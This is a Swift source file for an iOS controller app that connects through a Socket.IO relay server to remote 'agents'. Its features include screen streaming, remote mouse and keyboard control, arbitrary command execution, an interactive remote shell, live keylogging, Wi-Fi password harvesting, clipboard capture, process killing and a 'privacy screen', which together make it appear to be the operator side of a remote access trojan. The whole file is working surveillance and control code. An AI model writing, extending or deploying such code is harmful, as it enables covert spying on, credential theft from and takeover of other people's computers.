import Foundation
import UIKit

// Connects to the Nora relay server via Socket.IO v4.
// FastCap video arrives via Socket.IO fastcap_video events (no direct UDP).

final class RelayClient: ObservableObject {

    // MARK: - Published state

    @Published var agents:       [String] = []
    @Published var connected     = false
    @Published var selectedAgent: String? = nil

    // Callbacks set by ViewModel
    var onJpegFrame:        ((Data) -> Void)?
    var onFastcapFrame:     ((Data) -> Void)?           // H.264 annex-B
    var onFastcapReady:     (() -> Void)?
    var onWebrtcOffer:      ((String, String) -> Void)? // (sdp, type)
    var onLog:              ((String) -> Void)?

    // Hub feature callbacks
    var onPrivacyResult:    ((Bool, String) -> Void)?   // (active, message)
    var onScreenshotResult: ((UIImage?) -> Void)?
    var onSysInfoResult:    (([String: Any]) -> Void)?
    var onCommandResult:    ((String) -> Void)?
    var onKeylogStatus:     ((Bool, String) -> Void)?   // (running, error)
    var onKeyChar:          ((String) -> Void)?         // live keylog char
    var onShellOutput:      ((String, Bool) -> Void)?   // (data, closed)
    var onPowerResult:      (([String: Any]) -> Void)?
    var onWifiPasswords:    (([String: Any]) -> Void)?
    var onProcesses:        (([[String: Any]]) -> Void)?
    var onClipboard:        ((String) -> Void)?         // clipboard content from agent

    // MARK: - Private

    private var sio: SocketIOClient
    private var relayURL: URL
    private var streaming = false
    private var fcSession  = ""
    private var fcPassword = ""

    // MARK: - Init

    init(relayURL: URL) {
        self.relayURL = relayURL
        sio = SocketIOClient(url: relayURL)
        _setup()
    }

    // MARK: - Connect / Disconnect

    func connect() {
        sio.connect()
    }

    func disconnect() {
        sio.disconnect()
        DispatchQueue.main.async {
            self.connected     = false
            self.agents        = []
            self.selectedAgent = nil
        }
    }

    // MARK: - Agent selection

    func selectAgent(_ name: String) {
        selectedAgent = name
        sio.emit("hub_join", ["role": "hub"])
        onLog?("Selected agent: \(name)")
    }

    // MARK: - Screen stream control

    func startJpegStream() {
        guard let agent = selectedAgent else { return }
        streaming = true
        sio.emit("start_screen_stream", ["_target": agent])
        onLog?("start_screen_stream → \(agent)")
    }

    func stopJpegStream() {
        guard let agent = selectedAgent else { return }
        streaming = false
        sio.emit("stop_screen_stream", ["_target": agent])
        onLog?("stop_screen_stream → \(agent)")
    }

    // MARK: - FastCap via Socket.IO

    func joinFastcap() {
        guard !fcSession.isEmpty else {
            onLog?("No fastcap session yet — waiting for agent")
            return
        }
        sio.emit("fastcap_join", ["session": fcSession, "password": fcPassword])
        onLog?("fastcap_join session=\(String(fcSession.prefix(8)))…")
    }

    func stopFastcap() {
        // Relay times out the viewer automatically; nothing to send
    }

    // MARK: - WebRTC signaling

    func webrtcRequest() {
        guard let agent = selectedAgent else { return }
        sio.emit("webrtc_request", ["_target": agent])
        onLog?("webrtc_request → \(agent)")
    }

    func webrtcAnswer(sdp: String, type: String) {
        guard let agent = selectedAgent else { return }
        sio.emit("webrtc_answer", ["_target": agent, "sdp": sdp, "type": type])
        onLog?("webrtc_answer → \(agent) (sdp \(sdp.count) bytes)")
    }

    func webrtcStop() {
        guard let agent = selectedAgent else { return }
        sio.emit("webrtc_stop", ["_target": agent])
        onLog?("webrtc_stop → \(agent)")
    }

    // MARK: - Remote control (mouse, keyboard, type, scroll)

    func sendCommand(_ payload: [String: Any]) {
        guard let agent = selectedAgent else { return }
        var p = payload
        p["_target"] = agent
        sio.emit("command", p)
    }

    func mouseMove(x: Double, y: Double) {
        sendCommand(["action": "mousemove", "x": x, "y": y, "sw": 1, "sh": 1])
    }

    func mouseClick(x: Double, y: Double, button: Int = 0) {
        sendCommand(["action": "mouse_click", "x": x, "y": y, "sw": 1, "sh": 1, "button": button])
    }

    func mouseRightClick(x: Double, y: Double) {
        sendCommand(["action": "mouse_right", "x": x, "y": y, "sw": 1, "sh": 1])
    }

    func mouseDown(x: Double, y: Double, button: Int = 0) {
        sendCommand(["action": "mousedown", "x": x, "y": y, "sw": 1, "sh": 1, "button": button])
    }

    func mouseUp(x: Double, y: Double, button: Int = 0) {
        sendCommand(["action": "mouseup", "x": x, "y": y, "sw": 1, "sh": 1, "button": button])
    }

    func scroll(dy: Double) {
        sendCommand(["action": "scroll", "dy": dy])
    }

    func typeText(_ text: String) {
        sendCommand(["action": "type", "text": text])
    }

    func keyPress(key: String, code: String, ctrl: Bool = false, shift: Bool = false, alt: Bool = false) {
        var down: [String: Any] = ["action": "keydown", "key": key, "code": code]
        var up:   [String: Any] = ["action": "keyup",   "key": key, "code": code]
        if ctrl  { down["ctrlKey"]  = true; up["ctrlKey"]  = true }
        if shift { down["shiftKey"] = true; up["shiftKey"] = true }
        if alt   { down["altKey"]   = true; up["altKey"]   = true }
        sendCommand(down)
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.06) { [weak self] in
            self?.sendCommand(up)
        }
    }

    // MARK: - Hub feature commands

    func privacyStart() {
        guard let agent = selectedAgent else { return }
        sio.emit("privacy_start", ["_target": agent])
    }

    func privacyStop() {
        guard let agent = selectedAgent else { return }
        sio.emit("privacy_stop", ["_target": agent])
    }

    func takeScreenshot() {
        guard let agent = selectedAgent else { return }
        sio.emit("take_screenshot", ["_target": agent])
    }

    func getSysInfo() {
        guard let agent = selectedAgent else { return }
        sio.emit("get_sysinfo", ["_target": agent])
    }

    func runCommand(_ cmd: String) {
        guard let agent = selectedAgent else { return }
        sio.emit("run_command", ["_target": agent, "command": cmd])
    }

    func keylogOn() {
        guard let agent = selectedAgent else { return }
        sio.emit("keylog_on", ["_target": agent])
    }

    func keylogOff() {
        guard let agent = selectedAgent else { return }
        sio.emit("keylog_off", ["_target": agent])
    }

    func shellStart() {
        guard let agent = selectedAgent else { return }
        sio.emit("shell_start", ["_target": agent])
    }

    func shellInput(_ text: String) {
        guard let agent = selectedAgent else { return }
        sio.emit("shell_input", ["_target": agent, "data": text + "\n"])
    }

    func shellStop() {
        guard let agent = selectedAgent else { return }
        sio.emit("shell_stop", ["_target": agent])
    }

    func powerAction(_ action: String) {
        guard let agent = selectedAgent else { return }
        sio.emit("power_action", ["_target": agent, "action": action])
    }

    func getWifiPasswords() {
        guard let agent = selectedAgent else { return }
        sio.emit("get_wifi_passwords", ["_target": agent])
    }

    func getProcesses() {
        guard let agent = selectedAgent else { return }
        sio.emit("get_processes", ["_target": agent])
    }

    func killProcess(_ pid: Int) {
        guard let agent = selectedAgent else { return }
        sio.emit("kill_process", ["_target": agent, "pid": pid])
    }

    // MARK: - Private setup

    private func _setup() {
        sio.onConnect = { [weak self] in
            guard let self else { return }
            self.connected = true
            self.onLog?("Socket.IO connected")
            self.sio.emit("hub_join", ["role": "hub"])
        }

        sio.onDisconnect = { [weak self] err in
            guard let self else { return }
            self.connected = false
            self.agents    = []
            self.onLog?("Socket.IO disconnected: \(err?.localizedDescription ?? "none")")
        }

        // Agent list
        sio.on("agent_list") { [weak self] args in
            guard let self,
                  let first = args.first,
                  let list  = first as? [[String: Any]] else { return }
            let names = list.compactMap { $0["name"] as? String }
            self.agents = names
            self.onLog?("Agents: \(names.joined(separator: ", "))")
        }

        sio.on("agent_joined") { [weak self] args in
            guard let self,
                  let d    = args.first as? [String: Any],
                  let name = d["name"] as? String else { return }
            if !self.agents.contains(name) {
                self.agents.append(name)
                self.onLog?("Agent joined: \(name)")
            }
        }

        sio.on("agent_left") { [weak self] args in
            guard let self,
                  let d    = args.first as? [String: Any],
                  let name = d["name"] as? String else { return }
            self.agents.removeAll { $0 == name }
            if self.selectedAgent == name { self.selectedAgent = nil }
            self.onLog?("Agent left: \(name)")
        }

        // JPEG screen frame
        sio.on("frame") { [weak self] args in
            guard let self,
                  let d   = args.first as? [String: Any],
                  let b64 = d["data"] as? String,
                  let img = Data(base64Encoded: b64) else { return }
            self.onJpegFrame?(img)
        }

        // FastCap info
        sio.on("fastcap_info") { [weak self] args in
            guard let self,
                  let d    = args.first as? [String: Any],
                  let sess = d["session"]  as? String,
                  let pass = d["password"] as? String else { return }
            self.fcSession  = sess
            self.fcPassword = pass
            self.onLog?("fastcap_info session=\(sess.prefix(8))…")
        }

        sio.on("fastcap_ready") { [weak self] args in
            guard let self,
                  let d    = args.first as? [String: Any],
                  let host = d["host"] as? Bool, host else { return }
            self.onFastcapReady?()
            self.onLog?("fastcap_ready: host alive")
        }

        sio.on("fastcap_video") { [weak self] args in
            guard let self,
                  let d   = args.first as? [String: Any],
                  let b64 = d["b64"] as? String,
                  let raw = Data(base64Encoded: b64, options: .ignoreUnknownCharacters),
                  raw.count > 1 else { return }
            self.onFastcapFrame?(Data(raw.dropFirst()))
        }

        // WebRTC
        sio.on("webrtc_offer") { [weak self] args in
            guard let self,
                  let d   = args.first as? [String: Any],
                  let sdp = d["sdp"]  as? String,
                  let typ = d["type"] as? String else { return }
            self.onLog?("webrtc_offer received (sdp \(sdp.count) bytes)")
            self.onWebrtcOffer?(sdp, typ)
        }

        // ── Hub feature results ────────────────────────────────────────────

        sio.on("privacy_result") { [weak self] args in
            guard let self, let d = args.first as? [String: Any] else { return }
            let active = d["active"] as? Bool ?? false
            let msg    = d["error"]  as? String ?? (active ? "Privacy screen on" : "Privacy screen off")
            self.onPrivacyResult?(active, msg)
        }

        sio.on("screenshot_result") { [weak self] args in
            guard let self, let d = args.first as? [String: Any] else { return }
            if let b64 = d["data"] as? String,
               let raw  = Data(base64Encoded: b64, options: .ignoreUnknownCharacters),
               let img  = UIImage(data: raw) {
                self.onScreenshotResult?(img)
            } else {
                self.onScreenshotResult?(nil)
            }
        }

        sio.on("sysinfo_result") { [weak self] args in
            guard let self, let d = args.first as? [String: Any] else { return }
            self.onSysInfoResult?(d)
        }

        sio.on("command_result") { [weak self] args in
            guard let self, let d = args.first as? [String: Any] else { return }
            let out = d["output"] as? String ?? d["error"] as? String ?? "(no output)"
            self.onCommandResult?(out)
        }

        sio.on("keylog_status") { [weak self] args in
            guard let self, let d = args.first as? [String: Any] else { return }
            let running = d["running"] as? Bool ?? false
            let err     = d["error"]   as? String ?? ""
            self.onKeylogStatus?(running, err)
        }

        // Live keylog chars arriving from agent
        sio.on("key") { [weak self] args in
            guard let self, let d = args.first as? [String: Any],
                  let ch = d["char"] as? String else { return }
            self.onKeyChar?(ch)
        }

        sio.on("shell_output") { [weak self] args in
            guard let self, let d = args.first as? [String: Any] else { return }
            let data   = d["data"]   as? String ?? ""
            let closed = d["closed"] as? Bool   ?? false
            self.onShellOutput?(data, closed)
        }

        sio.on("power_result") { [weak self] args in
            guard let self, let d = args.first as? [String: Any] else { return }
            self.onPowerResult?(d)
        }

        sio.on("wifi_passwords_result") { [weak self] args in
            guard let self, let d = args.first as? [String: Any] else { return }
            self.onWifiPasswords?(d)
        }

        sio.on("processes_result") { [weak self] args in
            guard let self, let d = args.first as? [String: Any] else { return }
            let procs = d["processes"] as? [[String: Any]] ?? []
            self.onProcesses?(procs)
        }

        // Clipboard content pushed from agent
        sio.on("clipboard") { [weak self] args in
            guard let self, let d = args.first as? [String: Any],
                  let text = d["text"] as? String else { return }
            self.onClipboard?(text)
        }
    }
}
